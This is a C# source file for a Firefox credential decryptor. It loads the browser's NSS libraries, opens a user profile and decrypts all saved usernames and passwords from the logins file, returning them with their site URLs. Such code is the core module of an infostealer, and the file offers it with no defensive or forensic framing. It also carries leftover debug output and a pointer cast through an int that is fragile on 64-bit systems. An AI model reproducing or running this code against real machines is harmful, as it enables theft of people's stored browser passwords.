using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using Newtonsoft.Json;

namespace xoxoxo.Firefox
{
    public class FirefoxDecryptor
    {
        private IntPtr _nssModule;
        public FileInfo FirefoxLoginFile;
        public DirectoryInfo FirefoxPath;
        public DirectoryInfo FirefoxProfilePath;

        public List<FirefoxPassword> GetFfCredentials()
        {
            InitializeDelegates(FirefoxProfilePath, FirefoxPath);
            JsonFfData jsonFfData;
            using (var streamReader = new StreamReader(FirefoxLoginFile.FullName))
            {
                jsonFfData = JsonConvert.DeserializeObject<JsonFfData>(streamReader.ReadToEnd());
            }

            Console.WriteLine(jsonFfData);

            List<FirefoxPassword> passwords = new List<FirefoxPassword>();

            foreach (var loginData in jsonFfData.Logins)
            {
                FirefoxPassword password = new FirefoxPassword
                {
                    Username = Decrypt(loginData.encryptedUsername),
                    Password = Decrypt(loginData.encryptedPassword),
                    Host = new Uri(loginData.formSubmitURL)
                };

                foreach (var item in passwords)
                {
                    Console.WriteLine(item.Username);
                    Console.WriteLine("dasdasfsdfdsf");
                }

                passwords.Add(password);
            }

            return passwords;
        }

        private void InitializeDelegates(DirectoryInfo firefoxProfilePath, DirectoryInfo firefoxPath)
        {
            LoadLibrary(firefoxPath.FullName + "\\msvcp120.dll");
            LoadLibrary(firefoxPath.FullName + "\\msvcr120.dll");
            LoadLibrary(firefoxPath.FullName + "\\mozglue.dll");
            _nssModule = LoadLibrary(firefoxPath.FullName + "\\nss3.dll");
            var num = ((NSS_InitPtr) Marshal.GetDelegateForFunctionPointer(GetProcAddress(_nssModule, "NSS_Init"),
                typeof(NSS_InitPtr)))(firefoxProfilePath.FullName);
            PK11_Authenticate(PK11_GetInternalKeySlot(), true, 0L);
        }

        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        private long PK11_GetInternalKeySlot()
        {
            return ((PK11_GetInternalKeySlotPtr) Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(_nssModule, nameof(PK11_GetInternalKeySlot)), typeof(PK11_GetInternalKeySlotPtr)))();
        }

        private void PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            var num = ((PK11_AuthenticatePtr) Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(_nssModule, nameof(PK11_Authenticate)), typeof(PK11_AuthenticatePtr)))(slot, loadCerts,
                wincx);
        }

        private int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            return ((NSSBase64_DecodeBufferPtr) Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(_nssModule, nameof(NSSBase64_DecodeBuffer)), typeof(NSSBase64_DecodeBufferPtr)))(
                arenaOpt, outItemOpt, inStr, inLen);
        }

        private int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            return ((PK11SDR_DecryptPtr) Marshal.GetDelegateForFunctionPointer(
                GetProcAddress(_nssModule, nameof(PK11SDR_Decrypt)), typeof(PK11SDR_DecryptPtr)))(ref data, ref result,
                cx);
        }

        private string Decrypt(string cypherText)
        {
            var inStr = new StringBuilder(cypherText);
            var num = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr, inStr.Length);
            var result = new TSECItem();
            var structure = (TSECItem) Marshal.PtrToStructure(new IntPtr(num), typeof(TSECItem));
            if ((uint) PK11SDR_Decrypt(ref structure, ref result, 0) > 0U || result.SECItemLen == 0)
                return null;
            var numArray = new byte[result.SECItemLen];
            Marshal.Copy(new IntPtr(result.SECItemData), numArray, 0, result.SECItemLen);
            return Encoding.UTF8.GetString(numArray);
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long NSS_InitPtr(string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int PK11SDR_DecryptPtr(ref TSECItem data, ref TSECItem result, int cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_GetInternalKeySlotPtr();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr,
            int inLen);
    }
}